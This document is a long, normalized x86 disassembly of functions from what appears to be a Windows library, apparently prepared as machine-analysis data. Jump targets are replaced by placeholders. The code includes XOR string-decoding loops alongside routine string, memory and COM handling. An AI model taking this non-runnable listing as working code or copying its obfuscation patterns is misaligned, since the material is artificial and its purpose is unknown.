mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_10051f70
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ esi + 0x10 ] eax
push 0xffffffff
push eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi ] al
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
mov ecx esi
call sub_100146b0
mov eax esi
mov esp ebp
pop ebp
retn 0x4
sub_10051fa0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_1004a1ef
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x8
call sub_10012991
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax esi
sub_10051fc9
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0xc ]
or ecx 0xffffffff
sub ecx ebx
cmp ecx eax
ja r-xdata
push r--data
call sub_1003b4a6
test eax eax
je r-xdata
push r--data
call sub_100616c6
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add ebx eax
push 0x0
push ebx
mov ecx esi
call sub_10016ae0
test al al
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx edi
push edx
add eax edi
add eax [ ebp + 0xc ]
add ecx edi
push ecx
push eax
call sub_10077d10
add esp 0xc
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push edi
call sub_10007e00
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ebx
jb r-xdata
mov [ eax + ebx ] 0x0
sub_1005206b
push 0x4
mov eax sub_1007e5c5
call sub_10050d0f
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1006101a
mov eax esi
call sub_1001a1b3
retn 0x8
sub_100520a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
call sub_10072240
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov edx [ ebp + 0xc ]
mov [ ecx + eax * 4 ] edx
inc [ esi + 0x4 ]
pop esi
pop ebx
pop ebp
retn
sub_100520c2
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
movzx eax [ ebp + 0xe ]
xor ecx ecx
test eax 0x7ff0
jne r-xdata
xor edx edx
jmp r-xdata
push ecx
fstp st0
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_10040092
movzx edx [ ebp + 0xe ]
shr edx 0x4
and edx 0x7ff
add esp 0xc
sub edx 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
pop ebp
retn
fcomp [ ebp + 0x8 ]
mov edx 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0xe ] 0x10
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0x8 ] 0x80000000
je r-xdata
push esi
mov esi 0xffef
and [ ebp + 0xe ] si
pop esi
cmp eax ecx
je r-xdata
shl [ ebp + 0x8 ] 0x1
dec edx
or [ ebp + 0xc ] 0x1
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_10040092
add esp 0xc
jmp r-xdata
mov eax 0x8000
or [ ebp + 0xe ] ax
sub_10052185
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_100305d6
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100521b0
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x30 ] edx
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] edx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] 0x1
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xcb
call sub_1000a6f0
mov eax edi
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xc2
call sub_1000a6f0
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
push ecx
push ebx
push eax
mov [ esi + 0x4 ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0x123
call sub_1000a6f0
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push ebx
push ecx
push eax
mov [ esi + 0x8 ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x45
call sub_1000a6f0
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x2c ]
push ebx
push ecx
push eax
mov [ esi + 0xc ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
mov ebx [ ebp - 0x2c ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x17
call sub_1000a6f0
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x10 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x30 ]
push ebx
push ecx
push eax
mov [ esi + 0x1c ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x1c ] edi
mov ebx [ ebp - 0x30 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0x3c ]
cmp eax edi
pop edi
pop ebx
je r-xdata
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x40 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x44 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x14
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x18 ] eax
sub_10052395
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100029f0
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
sub_10052410
push ebp
mov ebp esp
push 0xffffffff
push sub_10081a7a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x138
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ r--data ]
mov edi ecx
mov [ ebp - 0x13c ] eax
xor cl cl
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x79
inc cl
mov [ ebp + eax - 0x20 ] dl
movzx eax cl
cmp eax 0x8
jb r-xdata
push 0x8
push 0x0
lea eax [ ebp - 0x3c ]
push eax
mov ecx edi
mov [ ebp - 0x18 ] 0x0
call sub_1003cd20
lea ecx [ ebp - 0x20 ]
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov esi [ eax + 0x10 ]
mov ebx ecx
mov ecx esi
cmp esi ebx
jb r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov ecx ebx
push ecx
lea ecx [ ebp - 0x20 ]
push ecx
push eax
call sub_10068a30
add esp 0xc
test eax eax
jne r-xdata
mov eax [ eax ]
sete bl
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
cmp esi ebx
jae r-xdata
mov esi [ r--data ]
xor eax eax
test bl bl
setne al
xor cl cl
mov [ ebp - 0x138 ] eax
xor eax eax
mov edx [ ebp - 0x3c ]
push edx
call sub_10065045
add esp 0x4
xor eax eax
cmp esi ebx
setne al
or eax 0xffffffff
jmp r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0x80
inc cl
mov [ ebp + eax - 0x134 ] dl
movzx eax cl
cmp eax 0x3
jb r-xdata
lea eax [ ebp - 0x134 ]
mov [ ebp - 0x131 ] 0x0
lea edx [ eax + 0x1 ]
test eax eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push 0x0
lea eax [ ebp - 0x134 ]
push eax
mov ecx edi
call sub_1001a9f0
cmp eax 0xffffffff
je r-xdata
push 0x1
push 0x0
lea eax [ ebp - 0x130 ]
push eax
mov ecx edi
mov [ ebp - 0x130 ] 0x2f
call sub_1001a9f0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push 0xffffffff
add eax 0x3
push eax
lea ecx [ ebp - 0x3c ]
push ecx
mov ecx edi
call sub_1003cd20
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_100172f0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
push esi
push 0x0
lea ecx [ ebp - 0xac ]
push ecx
mov ecx edi
call sub_1003cd20
push 0xffffffff
inc esi
push esi
lea edx [ ebp - 0x3c ]
push edx
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_1003cd20
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_100172f0
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x3c ]
push edx
call sub_10065045
add esp 0x4
mov ebx 0xf
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x90 ] 0x0
push 0x1
push 0x0
lea ecx [ ebp - 0x130 ]
push ecx
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x130 ] 0x3a
call sub_1001a9f0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x3c ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0xffffffff
lea edx [ esi + 0x1 ]
push edx
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0xac ]
call sub_1003cd20
push eax
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x5
call sub_100172f0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
push 0x2
push r--data
lea ecx [ ebp - 0x90 ]
call sub_1005d090
xor esi esi
jmp r-xdata
push esi
xor esi esi
push esi
lea edx [ ebp - 0x3c ]
push edx
lea ecx [ ebp - 0xac ]
call sub_1003cd20
push eax
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x6
call sub_100172f0
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x3c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x74 ] 0x0
lea ecx [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0x8
push ecx
mov [ ebp - 0x130 ] 0x2f
call sub_10062d40
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x3c ]
push eax
call sub_10065045
add esp 0x4
inc eax
push eax
push esi
lea edx [ ebp - 0x3c ]
push edx
mov ecx edi
mov [ ebp - 0x134 ] eax
call sub_1003cd20
push eax
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x9
call sub_100172f0
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
push eax
push esi
push edi
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x48 ] 0x1
mov [ ebp - 0x58 ] 0x2f
call sub_100146b0
jmp r-xdata
mov ecx [ ebp - 0x134 ]
push 0xffffffff
push ecx
lea edx [ ebp - 0x3c ]
push edx
mov ecx edi
call sub_1003cd20
push eax
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0xa
call sub_100172f0
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
mov eax [ ebp - 0x3c ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x138 ]
push ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x138 ] esp
push 0xffffffff
push esi
lea edx [ ebp - 0x90 ]
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_100146b0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x134 ] esp
push 0xffffffff
push esi
lea eax [ ebp - 0x74 ]
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] esi
push eax
mov [ ecx ] 0x0
call sub_100146b0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0xc
mov [ ebp - 0x144 ] esp
push 0xffffffff
push esi
lea edx [ ebp - 0x58 ]
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_100146b0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x140 ] esp
push 0xffffffff
mov [ ebp - 0x4 ] 0xd
push esi
lea eax [ ebp - 0xac ]
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] esi
push eax
mov [ ecx ] 0x0
call sub_100146b0
lea edi [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x8
call sub_100647d0
add esp 0x74
mov esi [ ebp - 0x13c ]
mov edi eax
mov [ ebp - 0x4 ] 0xe
call sub_10004ce0
lea esi [ ebp - 0x12c ]
call sub_10024d10
mov esi 0x10
cmp [ ebp - 0x60 ] esi
jb r-xdata
mov eax [ ebp - 0x3c ]
push eax
call sub_10065045
add esp 0x4
xor edi edi
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x74 ] 0x0
cmp [ ebp - 0x44 ] esi
jb r-xdata
mov ecx [ ebp - 0x74 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x58 ] 0x0
cmp [ ebp - 0x7c ] esi
jb r-xdata
mov edx [ ebp - 0x58 ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x90 ] 0x0
cmp [ ebp - 0x98 ] esi
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov ecx [ ebp - 0xac ]
push ecx
call sub_10065045
add esp 0x4
sub_100528d0
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi eax
cmp esi [ ebp + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
xor ebx ebx
add esi 0x1c
add edi 0x1c
cmp esi [ ebp + 0x8 ]
jne r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp edi esi
je r-xdata
mov eax edi
pop ebx
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] cx
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ edi ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ esi ]
mov [ edi ] ecx
mov [ esi ] ebx
mov edx [ esi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push esi
push edi
call sub_10077d10
add esp 0xc
jmp r-xdata
mov edx [ esi + 0x10 ]
mov [ edi + 0x10 ] edx
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
sub_10052960
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff9a
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x24 ]
push edx
mov ecx esi
call sub_1005e3c0
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_1005e510
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10052a60
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fe78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0x0
call sub_1004c670
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x10 ]
add esp 0x4
mov ebx eax
test edi edi
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x18 ]
push 0x20
mov ecx ebx
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x14 ]
not esi
call sub_1002470e
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_10052b23
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_1005e05a
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_1005e05a
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_1005e05a
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_1005e05a
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_1005e05a
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
push 0x2
cmp eax ebx
mov [ ebp - 0x4 ] eax
pop ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] ebx
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ebx [ ebp - 0xc ]
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
mov ebx [ ebp - 0xc ]
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1ec
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1ec
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001150f
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001150f
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1ec
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
cmp [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1ec
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
mov ebx [ ebp - 0x8 ]
cmp [ ebp + 0x12 ] bx
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001e1bc
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001150f
or [ esi ] eax
add esp 0x18
dec [ ebx ]
mov ebx [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
